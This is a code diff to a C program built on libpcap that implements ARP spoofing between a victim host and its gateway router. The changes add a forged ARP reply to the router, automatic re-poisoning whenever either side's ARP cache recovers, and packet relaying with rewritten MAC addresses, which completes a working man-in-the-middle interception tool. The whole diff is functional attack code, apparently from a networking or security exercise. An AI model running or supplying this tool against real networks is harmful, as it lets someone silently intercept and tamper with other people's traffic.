@@ -152,19 +152,40 @@ int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data){
 	return 1;
 }
 
+int make_sp_router(u_char* arp_data, u_char* targetip, u_char* req_data){
+	int i;
+
+	// target ip (38-41)
+	if(gatewayIP(&arp_data[38]) == 0){
+		printf("Error : Can't read gateway address! \n");
+	}
+	// sender IP (28-31)  --  fake to router
+	for(i=0;i<4;i++){
+		arp_data[28+i] = targetip[i];
+	}
+	// generating ARP request for ask router's MAC
+	if(make_request(req_data, &arp_data[38]) == 0){
+		printf("Error : Making Request \n");
+	}
+
+	return 1;
+}
+
 int main(int argc, char* argv[]){
 	char* device = NULL;// = "eth0";
 	pcap_t* pd;
 	int i;
 	u_char ippp;
 	int chk, cnt;
-	int snaplen = 100;
+	int snaplen = 1024;
 	char ebuf[PCAP_ERRBUF_SIZE];
 
 	u_char arp_data[42];
+	u_char arp_data_r[42];
 	u_char req_data[42];
 	u_char targetip[4];
 	u_char gatewip[4];
+	u_char relaying_data[snaplen];
 
 	struct pcap_pkthdr *header;
 	const u_char *pkt_data;
@@ -217,7 +238,7 @@ int main(int argc, char* argv[]){
 			exit(-1);
 		}
 	}
-	pd = pcap_open_live(device, snaplen, PROMISCUOUS, 1000, ebuf);
+	pd = pcap_open_live(device, snaplen, PROMISCUOUS, 1, ebuf);
 	if(pd == NULL){
 		perror(ebuf);
 		exit(-1);
@@ -278,29 +299,10 @@ int main(int argc, char* argv[]){
 
 ////////Spoofing Router/////////////////////////////////////////////////////////////
 
-/*
-	// source MAC (6-11)
-	if(eth0_MAC(&arp_data[6]) == 0){
-		printf("Error : Writing my MAC address at packet ! \n");
-	}
-	// sender MAC (22-27)
-	if(eth0_MAC(&arp_data[22]) == 0){
-		printf("Error : Writing my MAC address at packet ! \n");
-	}
-*/
+	memcpy(arp_data_r, arp_data, 42);
 
-	// target ip (38-41)
-	if(gatewayIP(&arp_data[38]) == 0){
-		printf("Error : Can't read gateway address! \n");
-	}
-	// sender IP (28-31)  --  fake to router
-	for(i=0;i<4;i++){
-		arp_data[28+i] = targetip[i];
-	}
-	// generating ARP request for ask router's MAC
-	if(make_request(req_data, &arp_data[38]) == 0){
-		printf("Error : Making Request \n");
-	}
+	make_sp_router(arp_data_r, targetip, req_data);
+
 	// send ARP request to router (broadcast)
 	if(pcap_sendpacket(pd,req_data,42) != 0){
 		printf("Error : Sending request packet!\n");
@@ -311,6 +313,7 @@ int main(int argc, char* argv[]){
 		/* Timeout elapsed */
 			continue;
 		
+		if(header->len > snaplen) continue;  // too long packet
 		// type check
 		if( ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0806 ){
 			// it's not ARP
@@ -320,8 +323,8 @@ int main(int argc, char* argv[]){
 			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){
 				if( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0] ){
 					for(i=0;i<6;i++){
-						arp_data[i] = pkt_data[6+i];
-						arp_data[32+i] = pkt_data[6+i];
+						arp_data_r[i] = pkt_data[6+i];
+						arp_data_r[32+i] = pkt_data[6+i];
 					}
 					break;
 				}
@@ -335,26 +338,85 @@ int main(int argc, char* argv[]){
 	}
 
 	// send ARP spoofing packet
-	if(pcap_sendpacket(pd,arp_data,42) != 0){
-		printf("Error : Sending request packet!\n");
+	if(pcap_sendpacket(pd,arp_data_r,42) != 0){
+		printf("Error : Sending arp spoofing packet!\n");
 	}
 
 	printf("Spoofing Router Finished\n");
-
+	for(i=0;i<42;i++) printf("%02x ",arp_data_r[i]);
+	printf("\n");
 ////////Spoofing Router/////////////////////////////////////////////////////////////
 
 	// relaying code
-	
 	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
 		if(res == 0) continue;
+		if(header->len > snaplen) continue; // too long packet
+		//printf("%d\n", header->len);
+		//for(i=0;i<header->len;i++) printf("%02x ",pkt_data[i]);
+		//printf("\n\n");
+		// Is it ARP type ?
 		if( ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0806 ){
-			// if arp -> check it is arp recovery
+			// if arp -> check for recognizing it is arp recovery
 			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){ // reply
-				if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0] ) && ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)(gatewip))[0] ) ){
-					// target is recovering router
-
+				// sender ip = victim ip ?
+				if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0] ) ){
+					// target ip = router ?
+					if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)gatewip)[0] ) ){
+						// !! target is recovering router !!
+						printf("Detected Recovering Router\n");
+						if(pcap_sendpacket(pd,arp_data_r,42) != 0){
+							printf("Error : Sending arp spoofing packet to router !\n");
+						}
+						printf(" -> Spoofing Router again Finished\n");
+					}
 				}
+				// sender ip = router ip ?
+				else if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)gatewip)[0] ) ){
+					// target ip = victim ip ?
+					if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)targetip)[0] ) ){
+						// !! target is recovering victim !!
+						printf("Detected Recovering Victim\n");
+						if(pcap_sendpacket(pd,arp_data,42) != 0){
+							printf("Error : Sending arp spoofing packet to victim !\n");
+						}
+						printf(" -> Spoofing Victim again Finished\n");
+					}
+				}
+			}
+		}
+
+		// relaying IP type Packet
+		else{// if(ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0800){ // IP type packet
+			//relaying_data = (u_char*)malloc(sizeof(pkt_data));	
+			chk = 1;
+			for(i=0;i<6;i++) // checking if source is router
+				chk = (chk & (arp_data_r[i] == pkt_data[6+i]));
+			if(chk != 0){
+				memcpy(relaying_data, pkt_data, header->len);
+				eth0_MAC(&relaying_data[6]); // source MAC = my MAC address
+				for(i=0;i<6;i++) relaying_data[i] = arp_data[i]; // dest MAC = victim MAC address
+				if(pcap_sendpacket(pd, relaying_data, header->len) != 0){
+					printf("Error : Relaying\n");
+				}
+				//free(relaying_data);
+				continue;
+			}
+			chk = 1;
+			for(i=0;i<6;i++) // checking if source is victim
+				chk = (chk & (arp_data[i] == pkt_data[6+i]));
+			if(chk != 0){
+				memcpy(relaying_data, pkt_data, header->len);
+				eth0_MAC(&relaying_data[6]); // source MAC = my MAC address
+				for(i=0;i<6;i++) relaying_data[i] = arp_data_r[i]; // dest MAC = router MAC address
+				if(pcap_sendpacket(pd, relaying_data, header->len) != 0){
+					printf("Error : Relaying\n");
+				}
+				//free(relaying_data);
+				continue;
+			}
+			//free(relaying_data);
 		}
 	}
+
 	return 0;
 }
